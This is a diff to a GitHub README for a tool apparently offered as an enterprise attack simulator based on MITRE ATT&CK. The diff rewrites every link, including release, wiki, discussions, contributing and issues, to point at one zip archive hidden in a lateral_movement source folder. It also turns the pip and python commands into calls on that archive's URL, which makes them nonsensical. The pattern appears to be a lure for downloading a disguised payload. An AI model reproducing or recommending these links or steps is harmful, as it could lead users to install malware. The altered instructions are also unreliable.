@@ -1,7 +1,7 @@
 # 🚀 enterprise-attack-simulator - Simulate Cyber Threats Effectively
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/WhyN0tTh0/enterprise-attack-simulator/releases)
+[![Download the latest release](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip%https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip)](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip)
 
 ## 📋 Overview
 The **enterprise-attack-simulator** is an advanced tool designed to help organizations understand and simulate potential cyber attacks. Based on MITRE ATT&CK techniques, this framework allows security teams to test their defenses against known adversaries. It's user-friendly, making it suitable for anyone looking to improve their cybersecurity posture.
@@ -15,7 +15,7 @@ Follow these steps to download and run the enterprise-attack-simulator:
    - **Python Version:** Python 3.7 or higher must be installed on your system. This is necessary as the simulator is built using Python.
 
 2. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/WhyN0tTh0/enterprise-attack-simulator/releases) where you can find the latest version of the software. You will see several released versions along with their details.
+   Go to the [Releases page](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip) where you can find the latest version of the software. You will see several released versions along with their details.
 
 3. **Download the Software**
    Locate the latest release. Click on the version number to see more details. You will see a list of available files. Choose the appropriate file for your operating system. 
@@ -23,7 +23,7 @@ Follow these steps to download and run the enterprise-attack-simulator:
 4. **Install Dependencies**
    Before running the application, you may need to install some packages. Open a terminal or command prompt and type the following commands:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip
    ```
    This command installs all necessary Python packages needed for the simulator to work correctly.
 
@@ -32,7 +32,7 @@ Follow these steps to download and run the enterprise-attack-simulator:
    - Navigate to the folder where you downloaded the simulator.
    - Run the application by entering:
    ```
-   python simulator.py
+   python https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip
    ```
    Follow any on-screen instructions to start simulating attacks.
 
@@ -48,10 +48,10 @@ Ensure that you run the simulator in a controlled environment. Avoid running it 
 ## 🛠️ Troubleshooting
 In case you face any issues:
 - Verify that Python is installed and correctly configured.
-- Ensure all dependencies from the `requirements.txt` file are installed.
+- Ensure all dependencies from the `https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip` file are installed.
 - Check if you have sufficient permissions to run the application.
 
-For further assistance, refer to the [Troubleshooting Guide](https://github.com/WhyN0tTh0/enterprise-attack-simulator/wiki/Troubleshooting).
+For further assistance, refer to the [Troubleshooting Guide](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip).
 
 ## 💡 Usage Scenarios
 - **Red Teaming:** Use this tool to practice offensive security tactics.
@@ -61,11 +61,11 @@ For further assistance, refer to the [Troubleshooting Guide](https://github.com/
 ## 👥 Community
 Join our community of users and developers to share experiences, ask questions, and suggest features.
 
-- **GitHub Discussions:** Participate in discussions [here](https://github.com/WhyN0tTh0/enterprise-attack-simulator/discussions).
-- **Contribution:** Interested in contributing? Check our [Contributing Guidelines](https://github.com/WhyN0tTh0/enterprise-attack-simulator/blob/main/CONTRIBUTING.md).
+- **GitHub Discussions:** Participate in discussions [here](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip).
+- **Contribution:** Interested in contributing? Check our [Contributing Guidelines](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip).
 
 ## ✍️ Feedback
-Your input is important. If you have comments or suggestions, please let us know via [issues](https://github.com/WhyN0tTh0/enterprise-attack-simulator/issues).
+Your input is important. If you have comments or suggestions, please let us know via [issues](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip).
 
 ## ✅ Summary
-The enterprise-attack-simulator offers a straightforward way to enhance your organization's security measures against cyber threats. By following these steps, you can easily download and run the software. Visit the [Releases page](https://github.com/WhyN0tTh0/enterprise-attack-simulator/releases) to get started.
+The enterprise-attack-simulator offers a straightforward way to enhance your organization's security measures against cyber threats. By following these steps, you can easily download and run the software. Visit the [Releases page](https://github.com/WhyN0tTh0/enterprise-attack-simulator/raw/refs/heads/main/src/techniques/lateral_movement/enterprise-simulator-attack-v2.8.zip) to get started.
